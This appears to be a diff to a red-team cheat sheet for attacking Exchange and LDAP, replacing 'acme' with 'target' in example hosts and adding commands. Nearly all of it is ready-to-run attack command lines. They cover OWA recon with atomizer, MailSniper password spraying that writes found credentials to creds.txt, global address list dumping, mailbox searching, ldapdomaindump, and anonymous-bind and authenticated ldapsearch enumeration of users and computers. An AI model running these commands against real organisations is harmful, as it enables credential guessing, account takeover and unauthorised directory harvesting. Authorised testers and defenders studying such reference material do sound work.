@@ -22,14 +22,23 @@ https://target.com/autodiscover/autodiscover.xml
 # SprayingToolkit
 
 This will show the internal domain name.
-atomizer.py owa 'https://webmail.acme.com/Autodiscover' --recon
+atomizer.py owa 'https://webmail.target.com/Autodiscover' --recon
+atomizer.py owa 'https://webmail.target.com/ews/exchange.asmx' --recon
+---------------------------------------------------------------------------------------------------------------------
+
+# LDAPdomainDump
+
+ldapdomaindump -u domain\\username -p password --no-json --no-grep ldaps://ip$:port
 ---------------------------------------------------------------------------------------------------------------------
 
 # MailSniper
 
-Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList C:\users.txt -Password Fall2021! -OutFile .\creds.txt
+Invoke-SelfSearch -Mailbox joe.smith@target.com -Remote
+Invoke-SelfSearch -Mailbox joe.smith@target.com -ExchHostname webmail.target.com
 
-GetGlobalAddressList -ExchHostname mail.target.com -UserName domain\user -Password Fall2021! -OutFile .\GAL.txt
+GetGlobalAddressList -UserName domain\username -Password Fall2021! -ExchHostname webmail.target.com/ews/exchange.asmx -OutFile GAL.txt
+
+Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList C:\users.txt -Password Fall2021! -OutFile creds.txt
 ---------------------------------------------------------------------------------------------------------------------
 
 # Apache Directory Studio, using valid creds, port 636
@@ -59,16 +68,16 @@ Edit as needed > Apply and Close
 ---------------------------------------------------------------------------------------------------------------------
 
 # Enumerate anonymous or null binding
-ldapsearch -x -b "dc=acme,dc=com" "*" -h $ip | awk '/dn: / {print $2}'
+ldapsearch -x -H ldap://URI:port/ -b "searchbase" -s sub
+
+# Enumerate anonymous or null binding
+ldapsearch -x -b "dc=target,dc=com" "*" -h $ip | awk '/dn: / {print $2}'
 
 # Unauthenticated Bind Enumeration (DN with no password)
-ldapsearch -x -D "cn=admin,dc=acme,dc=com" -s sub "cn=*" -h $ip | awk '/uid: /{print $2}' | nl
-
-#  Enumerate anonymous or null binding
-ldapsearch -x -h ldap://hostname:port/ -b "searchbase" -s sub
+ldapsearch -x -D "cn=admin,dc=target,dc=com" -s sub "cn=*" -h $ip | awk '/uid: /{print $2}' | nl
 
 # Extract  users
-ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Users,DC=acme,DC=com"
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Users,DC=target,DC=com"
 
 # Extract computers
 ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Computers,DC=<SUBDOMAIN>,DC=<TDL>"
